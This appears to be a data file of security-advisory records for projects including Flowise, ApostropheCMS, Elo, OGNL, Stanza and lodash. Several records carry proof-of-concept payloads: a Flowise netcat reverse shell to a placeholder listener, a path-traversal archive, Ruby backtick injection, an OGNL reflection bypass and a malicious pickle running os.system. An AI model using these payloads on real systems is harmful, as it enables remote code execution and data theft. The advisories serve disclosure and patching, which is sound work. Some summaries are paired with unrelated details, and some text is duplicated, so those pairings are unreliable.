old.summary: Vantage6: No limit on emails sent for password/MFA reset
old.details:
### Impact
Users can reset their MFA token via API routes that send them an email. Currently the number of emails that is sent is not limited. This gives attackers the option to flood someones mailbox with a lot of emails, and would have adverse effects on the SMTP server which may be seen as spam sender.

Note resetting the MFA token requires a correct password, so the potential impact for this is very low.

### Patches
No

### Workarounds
No

old.summary: Flowise has unsandboxed remote code execution via Custom MCP
old.details:
### Summary
The Custom MCPs feature is designed to execute OS commands, for instance, using tools like `npx` to spin up local MCP Servers. However, Flowise's inherent authentication and authorization model is minimal and lacks role-based access controls (RBAC). Furthermore, the default installation of Flowise operates without authentication unless explicitly configured using the `FLOWISE_USERNAME` and `FLOWISE_PASSWORD` environment variables.

This combination presents a significant security risk, potentially allowing users on the platform to execute unsandboxed system commands. This can result in Remote Code Execution (RCE) and complete compromise of the running platform container or server.

### PoC
1. Follow the provided instructions for running the app using Docker Compose (or other methods of your choosing such as `npx`, `pnpm`, etc):
   https://github.com/FlowiseAI/Flowise?tab=readme-ov-file#-docker

2. Create a new file named `payload.json` somewhere in your machine, with the following data:
```
{"inputs":{"mcpServerConfig":{"command": "touch","args": ["/tmp/yofitofi"]}},"loadMethod":"listActions"}
```

3. Send the following `curl` request using the `payload.json` file created above with the following command:
```
curl -XPOST -H "x-request-from: internal" -H "Content-Type: application/json" --data @payload.json "http://localhost:3000/api/v1/node-load-method/customMCP"
```

4. Observe that a new file named `yofitofi` is created under `/tmp` folder.

Similarily, we can use the same technique to gain a reverse shell using the built-in `nc` utility with the following JSON payload:
```
{"inputs":{"mcpServerConfig":{"command": "nc","args": [
"<LISTENER_IP_ADDRESS>","<LISTENER_PORT>","-e","/bin/sh"
]}},
"loadMethod":"listActions"}
```

![Pasted image 20250420132335](https://github.com/user-attachments/assets/b41093b9-a0d7-415e-bf9b-b8cbce7183d6)

### Impact
Remote code execution

### Mitigation
- Consider adding additional access controls surronding sensitive functionality such as Custom MCP, e.g. only users with "Admin" roles will be able to configure new Custom MCPs within the platform.
- Consider disabling the Custom MCP feature by default, with a clear disclaimer for end users on the implications of enabling this feature.
- Consider running Custom MCPs within a sandboxed environment

### Credit
The vulnerability was discovered by Assaf Levkovich of the JFrog Security Research team.

old.summary: Apache Airflow: Authenticated users can bypass the `is_safe_url` check
old.details: A bug in the login redirect route in Apache Airflow allowed authenticated users to craft URLs that bypassed the `is_safe_url` check, enabling redirection from a trusted Airflow domain to an attacker-controlled origin. Users are advised to upgrade to `apache-airflow` 3.2.2 or later. As a defense-in-depth mitigation, deployment operators can place Airflow behind a reverse proxy that strips off-domain `next=` query parameters before they reach the login endpoint.

old.summary: ApostropheCMS: Arbitrary file read via import-export attachment-name path traversal
old.details:
## Summary

The `@apostrophecms/import-export` module reconstructs the on-disk source path of every imported attachment from JSON metadata contained in the uploaded archive.

The archive carries an `aposAttachments.json` file whose `name` and `extension` fields are concatenated into a filesystem path with no traversal check. The zip-slip guard that the module applies during tar extraction validates tar entry names only and does not cover this second path, which is built after extraction.

The file at the resulting path is read and copied into the public uploads directory, then served over HTTP without authentication. A `../` sequence in `name` makes the module read a file outside the extraction directory and publish it at an anonymous URL.

Result: an authenticated contributor reads any file on the host whose name ends in an allowlisted extension (other users' uploaded documents, text or CSV dumps, PDFs) by importing a crafted archive and fetching the planted attachment anonymously.

## Affected

apostrophecms/apostrophe with the `@apostrophecms/import-export` module installed and registered. Module version 3.6.1 (current latest), tested against Apostrophe 4.31.0 (monorepo HEAD 4d478d9). Requires an account with the contributor role or higher; guest and anonymous requests are rejected. The module is not part of the default starter kit, so sites that never installed it are not affected. Files whose real name lacks an accepted file-group extension are not reachable.

## Root cause

The import parser builds each attachment's source path by concatenating attacker-controlled JSON fields: `lib/formats/gzip.js:46` sets `file.path = path.join(attachmentFilesPath, ${attachment._id}-${attachment.name}.${attachment.extension})` from the `aposAttachments.json` entries in the uploaded archive. That path flows unchanged through `lib/methods/import.js:832` (`insertAttachments`) into `lib/methods/import.js:1074` (`attachment.insert`), where uploadfs copies the referenced file into the public uploads directory served by `express.static`. The archive's only traversal guard, `lib/formats/gzip.js:143` (`if (name.includes('../'))`), validates tar entry names during extraction and never inspects the `name`/`extension` values used to construct the read path, so a `name` of `../../../../../../tmp/secret` escapes `attachmentFilesPath`. Reaching the sink requires only an authenticated session (`lib/methods/import.js:71`), view permission on the target type (`lib/methods/index.js:54`), and the `upload-attachment` permission enforced at `modules/@apostrophecms/attachment/index.js:442`, which the built-in contributor role holds. The trailing `.${extension}` is appended and checked against the file-group allowlist in `modules/@apostrophecms/attachment/index.js` (`getFileGroup`), so the target file's real name must end in an accepted extension (txt, csv, pdf, xls, doc, svg, and similar).

## Reproduction

Apostrophe 4.31.0 starter-kit-essentials, MongoDB, default roles, `@apostrophecms/import-export` 3.6.1 installed, local uploadfs backend.

1. Place a secret file outside the upload tree with an allowlisted extension.

```
$ cat /tmp/apos_victim_secret.txt
TOP-SECRET DB DUMP
DB_PASSWORD=Pr0d-Secret-9981
API_KEY=sk_live_victim_abcdef
```

2. Build a gzip archive whose `aposAttachments.json` points the attachment `name` at that file through traversal (`aposDocs.json` is `[]`).

```
[{"_id":"evilatt0001","name":"../../../../../../../../../../../../tmp/apos_victim_secret","extension":"txt","title":"loot","docIds":[],"crops":[]}]
```

3. As a contributor, import the archive through the module's import action (`POST /api/v1/@apostrophecms/<type>/import-export-import`), then fetch the created attachment with no session.

```
$ curl -i http://localhost:3500/uploads/attachments/evilatt0001-apos-victim-secret.txt
HTTP/1.1 200 OK
Content-Type: text/plain; charset=UTF-8

TOP-SECRET DB DUMP
DB_PASSWORD=Pr0d-Secret-9981
API_KEY=sk_live_victim_abcdef
```

Live-verified: a contributor-driven import reads `/tmp/apos_victim_secret.txt` (outside the extraction directory) and serves it at an anonymous URL; the same import run as a guest is rejected at the `upload-attachment` check (`modules/@apostrophecms/attachment/index.js:442`).

## Impact

- Read of arbitrary host files whose real name ends in an allowlisted extension (txt, csv, pdf, xls, doc, svg, and similar).
- Disclosure of other users' uploaded documents and any allowlisted-extension file readable by the Node process.
- The exfiltration target is copied to a public, unauthenticated URL.
- Triggered by the contributor role in a single import, no admin interaction.

## Credit

Jan Kahmen, [turingpoint](https://www.turingpoint.de) (jan@turingpoint.de)

new.summary: Elo Ruby backend has Remote Code Execution via unescaped `#{...}` interpolation in emitted string literals and subtype-constraint labels
new.details:
### Summary

Elo's Ruby backend emits attacker-controlled text into Ruby double-quoted strings without escaping the `#` character. Because `#` begins Ruby's interpolation sequences — `#{expr}`, `#@ivar`, `#@@cvar`, `#$gvar` — and any expression wrapped in `#{...}` may use backticks for shell execution, an Elo program that contains a crafted string literal or a labelled subtype constraint compiles to Ruby that evaluates attacker-chosen Ruby, and through backticks runs attacker-chosen shell commands, at runtime.

The same Elo source compiled to JavaScript, Python, or SQL is benign, so the bug also breaks the cross-target portability guarantee the rest of the compiler honours.

### Vulnerable sinks

Two sinks exist in `src/compilers/ruby.ts` at commit `749af7b`:

1. **String-literal emitter — lines 180–184.**
   The emitter escapes backslash, double quote, and control characters, but not `#`. Any `#{...}` sequence in an Elo string literal flows straight into the emitted Ruby source.

2. **Labelled subtype-constraint branch — lines 405–412.**
   The error message passed to `p_fail(p, "...")` is wrapped in a Ruby double-quoted string with no escape pass at all. Because the parser at `src/parser.ts:1339–1348` accepts single-quoted Elo strings as constraint labels, a label such as `'#{` `` `id` `` `}'` flows unchanged into the emitted Ruby.

### Attack surfaces

All three surfaces share the same root cause (the missing `#` escape in the Ruby double-quoted-string emission path) and are addressed by the same patch:

| # | Entry point | Threat model |
|---|---|---|
| 1 | `/try` playground on elo-lang.org (Ruby target) | 0-click server-side RCE against elo-lang.org infrastructure from a shared PoC URL |
| 2 | `bin/eloc -t ruby -x` on a CI or DevOps host | RCE on any host that passes Elo strings through the CLI |
| 3 | Library API — `defaultFormats.elo.parse()` with a Ruby emission step | Ruby RCE for any downstream integrator using Elo as a rule engine, configuration DSL, or form builder DSL (the primary documented use cases) |

### Proof of Concept

**String-literal sink:**

```
# poc.elo
'RES=#{`id 2>&1`}'
```

```
$ eloc -t ruby -x poc.elo
# emitted Ruby contains:  "RES=#{`id 2>&1`}"
# running it returns the output of id(1).
```

Replacing `` `id 2>&1` `` with `` `touch /tmp/pwned` `` produces a trivially observable filesystem side effect.

**Subtype-constraint label sink:**

```
# poc-subtype.elo
let X = Int(i | '#{`touch /tmp/pwned2`}': i > 0) in X(-1)
```

The predicate fails for `-1`, causing `p_fail(p, "#{...}")` to interpolate and execute the backtick command at the Ruby layer.

Both flows are automated in the reproduction script submitted with the original report and were verified against Ruby 3.x.

### Root cause

The Ruby-emitter's double-quoted-string escape routine omitted `#` from its character set, and one emission path (the subtype-constraint label branch) performed no escape pass at all.

old.summary: NLTK: Model-artifact APIs bypass pathsec and touch files outside allowed roots
old.details:
### Summary

Several model-artifact APIs still treat caller-controlled model paths as ordinary filenames even when NLTK path security is enforced. The same outside-root paths are rejected by guarded helpers, but these public read and write flows still use raw file APIs.

### Details

- **Vulnerability type:** File sandbox bypass
- **Affected component:** `TransitionParser.train`, `TransitionParser.parse`, `AveragedPerceptron.save`, `AveragedPerceptron.load`, `PerceptronTagger.save_to_json`, `save_maxent_params`
- **Affected versions:** Published `3.9.4` and current source `v3.10.0-rc2` both reproduced.
- **Patched versions:** Not yet patched
- **Root cause:** Model import and export helpers use built-in `open()` on caller-controlled paths instead of pathsec-aware helpers.

`TransitionParser.train()` writes outside allowed roots, `TransitionParser.parse()` reads outside allowed roots, `AveragedPerceptron` bypasses the sandbox in both directions, and adjacent read-side helpers in the same family already show the intended guarded behavior. I confirmed outside-root reads and writes while `pathsec.open()` or the guarded sibling helpers rejected the same paths.

### PoC

**Preconditions**
- The application enables `pathsec` enforcement and lets untrusted workflows choose model import or export paths.

**Steps**
1. Enable `pathsec.ENFORCE=True` and restrict allowed roots to a dedicated sandbox directory.
2. Use public model import or export APIs with paths that point outside that root.
3. Observe the same paths are rejected by negative-control guarded helpers such as `pathsec.open()`, `PerceptronTagger.load_from_json()`, or `load_maxent_params()`.
4. Observe the vulnerable APIs still read or write outside-root files successfully.

**Minimal reproducible excerpt**

```text
transition_train_exists True
transition_parse_loader_read_bytes 13
averaged_load_keys ['bias']
maxent_save wrote ['alwayson.tab', 'labels.txt']
```

### Impact

Consumers that rely on `pathsec` for local containment can be tricked into reading or overwriting files outside approved roots through normal model persistence and loading APIs.

### Remediation

Route all model-path file access through `nltk.pathsec.open()` or existing pathsec-aware helpers, and add regression tests that pair each vulnerable API with a negative control on the same path.

old.summary: Flowise allows arbitrary file write to RCE
old.details: ### Summary An attacker could write files with arbitrary content to the filesystem via the `/api/v1/document-store/loader/process` API. An attacker can reach RCE(Remote Code Execution) via file writing. ### Details All file writing functions in [packages/components/src/storageUtils.ts](https://github.com/FlowiseAI/Flowise/blob/main/packages/components/src/storageUtils.ts) are vulnerable. - addBase64FilesToStorage - addArrayFilesToStorage - addSingleFileToStorage The fileName parameter, which is an untrusted external input, is being used as an argument to path.join() without verification. ```javascript const filePath = path.join(dir, fileName) fs.writeFileSync(filePath, bf) ``` Therefore, users can move to the parent folder via `../` and write files to any path. Once file writing is possible in all paths, an attacker can reach RCE (Remote Code Execution) in a variety of ways. In PoC (Proof of Concept), RCE was reached by overwriting package.json. ### PoC In PoC, `package.json` is overwritten. This is a scenario in which arbitrary code is executed when `pnpm start` is executed by changing the start command in the `scripts{}` statement to an arbitrary value. **- original start command** ```` "start": "run-script-os", ```` **- modify start command** ```` "start": "touch /tmp/pyozzi-poc && run-script-os", ```` When a user runs the `pnpm start` command, a `pyozzi-poc` file is created in the `/tmp` path. #### 1. package.json content base64 encoding ```json { "name": "flowise", "version": "1.8.2", "private": true, "homepage": "https://flowiseai.com", "workspaces": [ "packages/*", "flowise", "ui", "components" ], "scripts": { "build": "turbo run build && echo poc", "build-force": "pnpm clean && turbo run build --force", "dev": "turbo run dev --parallel", "start": "touch /tmp/pyozzi-poc && run-script-os", --> modify (add touch /tmp/pyozzi &&) "start:windows": "cd packages/server/bin && run start", "start:default": "cd packages/server/bin && ./run start", "clean": "pnpm --filter \"./packages/**\" clean", "nuke": "pnpm --filter \"./packages/**\" nuke && rimraf node_modules .turbo", "format": "prettier --write \"**/*.{ts,tsx,md}\"", "lint": "eslint \"**/*.{js,jsx,ts,tsx,json,md}\"", "lint-fix": "pnpm lint --fix", "quick": "pretty-quick --staged", "postinstall": "husky install", "migration:create": "pnpm typeorm migration:create" }, ... skip ``` #### 2. Overwrite `package.json` via `/api/v1/document-store/loader/process` > **Request Body** ```json { "loaderId": "textFile", "storeId": "c4b8a8fb-9eb6-47ae-9caa-7702ef8baabb", "loaderName": "Text File", "loaderConfig": { "txtFile": "data:text/plain;BASE64_ENCODEING_CONTENT,filename:/../../../../../usr/src/package.json", "textSplitter": "", "metadata": "", "omitMetadataKeys": "" } } ``` The part after `filename:` of the `txtFile` parameter is the value used as `fileName` in the function. Add `../` to the filename value to move to the top path, then specify `package.json` in the project folder `/usr/src/` as the path. Afterwards, when the user starts the server (`pnpm start`), the added script will be executed. (`touch /tmp/pyozzi-poc`) **- starting server with `touch /tmp/pyozzi-poc` command** **- `/tmp/pyozzi-poc` file created** ### Impact **Remote Code Execution (RCE)** Although it is demonstrated here using the file creation command, you can obtain full server shell privileges by opening a reverse shell.

new.details: ### Summary An attacker could write files with arbitrary content to the filesystem via the `/api/v1/document-store/loader/process` API. An attacker can reach RCE(Remote Code Execution) via file writing. ### Details All file writing functions in [packages/components/src/storageUtils.ts](https://github.com/FlowiseAI/Flowise/blob/main/packages/components/src/storageUtils.ts) are vulnerable. - addBase64FilesToStorage - addArrayFilesToStorage - addSingleFileToStorage The fileName parameter, which is an untrusted external input, is being used as an argument to path.join() without verification. ```javascript const filePath = path.join(dir, fileName) fs.writeFileSync(filePath, bf) ``` Therefore, users can move to the parent folder via `../` and write files to any path. Once file writing is possible in all paths, an attacker can reach RCE (Remote Code Execution) in a variety of ways. In PoC (Proof of Concept), RCE was reached by overwriting package.json. ### PoC In PoC, `package.json` is overwritten. This is a scenario in which arbitrary code is executed when `pnpm start` is executed by changing the start command in the `scripts{}` statement to an arbitrary value. **- original start command** ```` "start": "run-script-os", ```` **- modify start command** ```` "start": "touch /tmp/pyozzi-poc && run-script-os", ```` When a user runs the `pnpm start` command, a `pyozzi-poc` file is created in the `/tmp` path. #### 1. package.json content base64 encoding ```json { "name": "flowise", "version": "1.8.2", "private": true, "homepage": "https://flowiseai.com", "workspaces": [ "packages/*", "flowise", "ui", "components" ], "scripts": { "build": "turbo run build && echo poc", "build-force": "pnpm clean && turbo run build --force", "dev": "turbo run dev --parallel", "start": "touch /tmp/pyozzi-poc && run-script-os", --> modify (add touch /tmp/pyozzi &&) "start:windows": "cd packages/server/bin && run start", "start:default": "cd packages/server/bin && ./run start", "clean": "pnpm --filter \"./packages/**\" clean", "nuke": "pnpm --filter \"./packages/**\" nuke && rimraf node_modules .turbo", "format": "prettier --write \"**/*.{ts,tsx,md}\"", "lint": "eslint \"**/*.{js,jsx,ts,tsx,json,md}\"", "lint-fix": "pnpm lint --fix", "quick": "pretty-quick --staged", "postinstall": "husky install", "migration:create": "pnpm typeorm migration:create" }, ... skip ``` #### 2. Overwrite `package.json` via `/api/v1/document-store/loader/process` > **Request Body** ```json { "loaderId": "textFile", "storeId": "c4b8a8fb-9eb6-47ae-9caa-7702ef8baabb", "loaderName": "Text File", "loaderConfig": { "txtFile": "data:text/plain;BASE64_ENCODEING_CONTENT,filename:/../../../../../usr/src/package.json", "textSplitter": "", "metadata": "", "omitMetadataKeys": "" } } ``` The part after `filename:` of the `txtFile` parameter is the value used as `fileName` in the function. Add `../` to the filename value to move to the top path, then specify `package.json` in the project folder `/usr/src/` as the path. Afterwards, when the user starts the server (`pnpm start`), the added script will be executed. (`touch /tmp/pyozzi-poc`) **- starting server with `touch /tmp/pyozzi-poc` command** **- `/tmp/pyozzi-poc` file created** ### Impact **Remote Code Execution (RCE)** Although it is demonstrated here using the file creation command, you can obtain full server shell privileges by opening a reverse shell.

old.summary: Brotli: Out-of-bounds write in the Brotli decoder ("Node2Shell") also affects the PyPI Brotli package
old.details:
A buffer overflow vulnerability in the Brotli decoder (c/dec/decode.c) in Google Brotli versions 1.0.3 through 1.2.0 on all platforms allows a remote unauthenticated attacker to corrupt adjacent decoder state memory, disclose sensitive memory contents, cause a denial of service, or potentially execute arbitrary code using a crafted Brotli-compressed stream.

Users need to update any Brotli libraries or binaries between 1.0.3 through 1.2.0 to the latest available version: 1.0.10 or 1.1.1 or 1.2.1.

new.details:
### Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-8vvx-qvq9-5948. This link is maintained to preserve external references.

### Original Description

Flowise contains a path traversal vulnerability in the /api/v1/document-store/loader/process endpoint that allows unauthenticated attackers to write arbitrary files to the filesystem. Attackers can exploit unsanitized fileName parameters with ../ sequences to overwrite critical files like package.json and achieve remote code execution when the application restarts.

old.summary: OGNL stricter-invocation block list bypass via java.lang.reflect reflection proxies
old.details:
### Summary

OGNL's optional *stricter invocation* mode maintains a block list that prevents expressions from directly calling methods on dangerous classes such as `Runtime`, `ProcessBuilder`, and `ClassLoader`. The block list filters on the **declaring class of the method OGNL invokes**. Because `java.lang.reflect.Method` (and `Constructor`/`Field`) are not on the list, an expression can use reflection as a proxy — `someMethod.invoke(target, args)` — to reach a blocked method. The real call (e.g. `ProcessBuilder.start()`) then executes inside the JDK reflection machinery and never passes back through OGNL's `invokeMethod`, so the block list never sees it.

### Proof of concept

Under the default OGNL context (public-only access, stricter invocation enabled), the following expression creates a file even though a direct `new ProcessBuilder(...).start()` is blocked:

```
(#pb=new java.lang.ProcessBuilder({"/usr/bin/touch","rce-proof.txt"}),
 #methods=@java.lang.ProcessBuilder@class.getMethods(),
 #names=#methods.{ #this.getName() },
 #startIdx=#names.indexOf("start"),
 #methods[#startIdx].invoke(#pb, null))
```

### Impact and scope — please read carefully

**This is hardening of a defense-in-depth secondary layer, not a break of OGNL's primary security boundary.**

In OGNL the stricter-invocation block list is a *secondary* mitigation. The **primary** access-control gate is the `MemberAccess` implementation supplied by the integrating framework or application, which OGNL consults on every constructor and method call. Frameworks that evaluate untrusted expressions are expected to install a restrictive `MemberAccess` — for example, Apache Struts' `SecurityMemberAccess`, which excludes dangerous classes and the `java.lang.reflect` package. Against such a `MemberAccess` this PoC is blocked at the very first step (the `new ProcessBuilder(...)` constructor), before reflection is ever reachable.

The default context that ships with OGNL intentionally allows all public members and is **not** designed to sandbox untrusted input. An application that evaluates attacker-controlled expressions with that permissive default already has many paths to code execution, and this technique is not required to achieve it.

**You are affected only if all of the following hold:** (1) your application evaluates untrusted/attacker-controlled OGNL expressions, (2) it uses OGNL's default permissive `MemberAccess` (or an equivalently permissive one that allows `java.lang.reflect`), and (3) it relies on the stricter-invocation block list as its sandbox. **Properly configured consumers — including Apache Struts with its `SecurityMemberAccess` — are not affected.** The actual protection for untrusted-expression scenarios remains a correctly configured `MemberAccess`; the block list should not be treated as a sandbox.

### Fix

`java.lang.reflect.Method`, `java.lang.reflect.Constructor`, and `java.lang.reflect.Field` are added to the stricter-invocation block list, so reflection objects can no longer be used as invocation proxies in stricter mode. The `java.lang.invoke.MethodHandle` path was verified not to be exploitable (its signature-polymorphic `invoke`/`invokeExact` fail through OGNL's reflection-based invocation), so no additional classes are required.

### Credit

Reported responsibly through Tidelift by 毛锐 (youyi.mr@alibaba-inc.com).

old.summary: lodash vulnerable to Prototype Pollution via array path bypass in `_.unset` and `_.omit`
old.details:
### Impact

Lodash versions 4.17.23 and earlier are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. The fix for [CVE-2025-13465](https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as `Object.prototype`, `Number.prototype`, and `String.prototype`.

The issue permits deletion of prototype properties but does not allow overwriting their original behavior.

### Patches

This issue is patched in 4.18.0.

### Workarounds

None. Upgrade to the patched version.

The `_.unset`, `_.omit`, and `_.pullAt` functions are vulnerable to prototype pollution. The fix for [CVE-2025-13465](https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as `Object.prototype`, `Number.prototype`, and `String.prototype`.

The issue permits deletion of prototype properties but does not allow overwriting their original behavior.

### Patches

The issue is patched from 4.18.0 to 4.18.1 depending on the package: `lodash`, `lodash-es`, and `lodash-amd` in 4.18.1, and the standalone `lodash.unset` and `lodash.omit` packages in 4.18.0.

### Workarounds

None. Upgrade to the patched version.

### References

- [CVE-2025-13465 / GHSA-xxjr-mmjv-4gpg](https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) (original fix that this bypasses)

old.summary: Microsoft Security Advisory CVE-2026-102870 - ASP.NET Core Remote Code Execution Vulnerability
old.details: ## Executive summary Microsoft is releasing this security advisory to provide information about a vulnerability in the Blazor WebAssembly debugger included in `Microsoft.AspNetCore.Components.WebAssembly.Server`. This advisory also provides guidance on what developers can do to update their applications to remove this vulnerability. The Blazor WebAssembly debug proxy evaluates debugger expressions by generating and compiling C# source. Certain values originating in the application being debugged, including `ToString()` results, descriptions, and class names, are embedded in that generated source without consistent escaping. An attacker-controlled value can escape the generated string literal and execute code on a developer's machine when the developer evaluates an expression during debugging. ## Announcement Announcement for this issue can be found at https://github.com/dotnet/announcements/issues/445 ## CVSS Details - **Version:** 3.1 - **Severity:** High - **Score:** 8.8 - **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` - **Weakness:** CWE-94 (Improper Control of Generation of Code ('Code Injection')) ## Affected Platforms - **Platforms:** Windows, Linux, macOS - **Architectures:** All ## Affected Packages The vulnerability affects Microsoft .NET projects that use an affected package version listed below. Package name | Affected version | Patched version ------------ | ---------------- | --------------- [Microsoft.AspNetCore.Components.WebAssembly.Server](https://www.nuget.org/packages/Microsoft.AspNetCore.Components.WebAssembly.Server) | >= 10.0.0, <= 10.0.12 | 10.0.13 [Microsoft.AspNetCore.Components.WebAssembly.Server](https://www.nuget.org/packages/Microsoft.AspNetCore.Components.WebAssembly.Server) | >= 11.0.0-preview.1, <= 11.0.0-rc.1 | 11.0.0-rc.2.26478.115 ## Advisory FAQ ### How do I know if I am affected? You are affected if you use a vulnerable version of `Microsoft.AspNetCore.Components.WebAssembly.Server` to debug a Blazor WebAssembly application and evaluate an expression involving attacker-controlled application data. ### How do I fix the issue? 1. Install the latest supported version of .NET. 2. Update `Microsoft.AspNetCore.Components.WebAssembly.Server` to the patched version for the .NET release used by the application. Once the updated package or runtime is installed, restart the debugger and development environment. ## Other Information ### Reporting Security Issues If you have found a potential security issue in a supported version of .NET, please report it to the Microsoft Security Response Center (MSRC) via the [MSRC Researcher Portal](https://msrc.microsoft.com/report/vulnerability/new). Further information can be found in the MSRC [Report an Issue FAQ](https://www.microsoft.com/msrc/faqs-report-an-issue). Security reports made through MSRC may qualify for the Microsoft .NET Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at https://aka.ms/corebounty. ### Support You can ask questions about this issue on GitHub in the .NET GitHub organization. The main repositories are located at https://github.com/dotnet/runtime and https://github.com/dotnet/aspnetcore. The Announcements repository (https://github.com/dotnet/announcements) will contain this bulletin as an issue and will include a link to a discussion issue. ### Disclaimer The information provided in this advisory is provided "as is" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply. ### External Links [CVE-2026-102870](https://www.cve.org/CVERecord?id=CVE-2026-102870) ### Acknowledgements alittleston3 ### Revisions V1.0 (10/13/2026): Advisory published.

new.summary: Feast vulnerable to arbitrary code execution via unsafe deserialization of dill-serialized UDFs
new.details: A flaw was found in Feast. The system improperly deserializes user-defined functions (UDFs) stored in its registry, which are serialized using the 'dill' library. This allows a remote attacker to store a malicious UDF, leading to unauthenticated arbitrary code execution on the feature server in default configurations. An authenticated attacker can also achieve arbitrary code execution on the registry server by bypassing authorization checks during deserialization. This vulnerability can result in cross-tenant data access and lateral movement within the system.

new.summary: Stanza: RCE via pickle deserialization in the lemmatizer
new.details:
## TL;DR

Loading an attacker-supplied lemma `.pt` runs arbitrary code as the loading user. Since 1.14.0 the lemmatizer stores `pos_dict` as a gzip-compressed pickle in the checkpoint's `dicts` field (a `bytes` value). `torch.load(weights_only=True)` treats `bytes` as a primitive and passes it through unexamined, so its allowlist never sees the inner stream. `Trainer.load` then feeds those bytes to an **unrestricted `pickle.loads`**: the only bare `pickle.loads` in the tree. Result: `weights_only=True` gives no protection here, and model loading executes code.

Confirmed end-to-end against stanza 1.14.0 / PyTorch 2.13.0 / CPython 3.13.7: a crafted checkpoint whose payload `__reduce__` returns `(os.system, (cmd,))` ran the command at load time (marker file showed `uid=501(...)`, `executed_by=...`).

A downstream user is vulnerable whenever they build a pipeline that loads a caller-supplied lemmatizer checkpoint. i.e. `stanza.Pipeline(lang=..., processors="tokenize,pos,lemma", lemma_model_path="<attacker-influenced .pt>")` (or any equivalent load of an untrusted/shared lemma model through a custom registry) - since that call routes straight into `Trainer.load` -> `_unpack_pos_dict` and executes the embedded pickle at construction time.

## The vulnerable path

`stanza/models/lemma/trainer.py`:

```python
# _pack_pos_dict (write side): pos_dict -> pickle -> gzip -> bytes, stored under checkpoint['dicts']

def _unpack_pos_dict(data):                 # line 54
    buf = io.BytesIO(data)
    with gzip.GzipFile(fileobj=buf, mode="rb") as gz:
        raw = gz.read()
    return pickle.loads(raw)                # <-- unrestricted default unpickler
```

```python
def load(self, filename, ...):              # line 365
    checkpoint = torch.load(filename, ..., weights_only=True)   # outer allowlist; bytes pass through intact
    ...
    if dicts_version == _DICTS_VERSION_POS:                     # dicts_version == 2 (current format)
        self.pos_dict = _unpack_pos_dict(checkpoint['dicts'])   # line 378, no validation
```

**Reachable from the documented API.** `stanza.Pipeline(..., lemma_model_path=<file>)` -> `LemmaProcessor._set_up_model` -> `Trainer(model_file=…)` -> `Trainer.load`. Any shared/distributed checkpoint, custom registry, or caller-supplied `lemma_model_path` reaches it. No checksum is applied to caller-supplied paths (MD5 verification exists only in the default registry download flow). Trigger is at pipeline construction, before any inference input is processed.

Note: this is **not** the `weights_only=False` fallback fixed under CVE-2026-54499: the outer load stays safe; the exposure is entirely the inner pickle.

## Minimal PoC

```python
import gzip, io, os, pickle, tempfile, torch
from stanza.models.lemma.trainer import _unpack_pos_dict, _DICTS_VERSION_POS

MARKER = os.path.join(tempfile.gettempdir(), "stanza_lemma_poc_pwned")

class Payload:
    def __reduce__(self):
        return (os.system, ("id > %s 2>&1; echo executed_by=$(whoami) >> %s" % (MARKER, MARKER),))

buf = io.BytesIO()
with gzip.GzipFile(fileobj=buf, mode="wb") as gz:        # same shape as _pack_pos_dict()
    gz.write(pickle.dumps(Payload(), protocol=4))

ckpt = {"dicts": buf.getvalue(), "dicts_version": _DICTS_VERSION_POS}
pt = os.path.join(tempfile.gettempdir(), "evil_lemma.pt")
torch.save(ckpt, pt, _use_new_zipfile_serialization=False)

loaded = torch.load(pt, lambda s, l: s, weights_only=True)   # SUCCEEDS; dicts is bytes, intact
_unpack_pos_dict(loaded["dicts"])                            # == trainer.py:378 -> command runs
print("pwned:", open(MARKER).read().strip())
```

The PoC calls `_unpack_pos_dict` directly: the exact expression at `trainer.py:378`. Reaching it through `stanza.Pipeline(...)` additionally requires the crafted file to carry a well-formed `config`/`vocab` so `load` runs to line 378 (established by source review); the deserialization to execution step is confirmed at runtime.

## Fix

Deserialize the inner stream with the `RestrictedUnpickler` the project already uses in `stanza/models/common/doc.py` (allowlists `tuple`/`list`/`dict` only):

```python
from stanza.models.common.doc import RestrictedUnpickler

def _unpack_pos_dict(data):
    buf = io.BytesIO(data)
    with gzip.GzipFile(fileobj=buf, mode="rb") as gz:
        raw = gz.read()
    return RestrictedUnpickler(io.BytesIO(raw)).load()
```

A legitimate `pos_dict` is a nested `{pos: {word: lemma}}` string mapping no class/function globals, so it loads cleanly, while any `os.system`-style payload is rejected by `find_class`. JSON would work equally well (all keys/values are strings) and remove pickle from this path entirely. Apply to both `_unpack_pos_dict` and, for forward compatibility, `_pack_pos_dict`.

old.summary: go-git missing validation decoding Index v4 files leads to panic
old.details:
### Impact

`go-git`’s index decoder for format version 4 fails to validate the path name prefix length before applying it to the previously decoded path name. A maliciously crafted index file can trigger an out-of-bounds slice operation, resulting in a runtime panic during normal index parsing.

This issue only affects Git index format version 4. Earlier formats (`go-git` supports only `v2` and `v3`) are not vulnerable to this issue.

An attacker able to supply a crafted `.git/index` file can cause applications using go-git to panic while reading the index. If the application does not recover from panics, this results in process termination, leading to a denial-of-service (DoS) condition.

Exploitation requires the ability to modify or inject a Git index file within the local repository in disk. This typically implies write access to the `.git` directory.

### Patches

Users should upgrade to `v5.17.1`, or the latest `v6` [pseudo-version](https://go.dev/ref/mod#pseudo-versions), in order to mitigate this vulnerability.

### Credit

go-git maintainers thank @kq5y for finding and reporting this issue privately to the `go-git` project.

### Impact

`go-git`’s index decoder for format version 4 fails to validate the path name prefix length before applying it to the previously decoded path name. A maliciously crafted index file can trigger an out-of-bounds slice operation, resulting in a runtime panic during normal index parsing.

This issue only affects Git index format version 4. Earlier formats (`go-git` supports only `v2` and `v3`) are not vulnerable to this issue.

